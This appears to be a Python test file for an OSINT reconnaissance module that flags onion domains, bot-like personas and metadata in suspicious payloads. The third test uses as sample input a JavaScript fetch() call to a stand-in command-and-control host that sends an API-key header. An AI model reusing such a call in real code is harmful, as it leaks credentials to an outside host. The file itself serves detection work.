from src.swarm.osint_recon import SwarmOSINTRecon


def test_osint_recon_domain_tor():
    res = SwarmOSINTRecon.analyze_domain("dom:hiddenmarket.onion")
    assert res.is_tor_or_proxy is True
    assert "darkweb:onion" in res.tags


def test_osint_recon_persona():
    res = SwarmOSINTRecon.analyze_persona("at:alpha_swarm_bot")
    assert res.is_bot_pattern is True
    assert "https://github.com/alpha_swarm_bot" in res.known_platforms


def test_osint_recon_payload_metadata():
    payload = "fetch('https://c2.example/api', {headers: {'X-API-Key': 'secret_token_123456789'}}); /var/log/app/worker.log"
    res = SwarmOSINTRecon.extract_payload_metadata(payload)
    assert "net:http_client" in res.software_signatures
    assert any("/var/log" in p for p in res.extracted_paths)
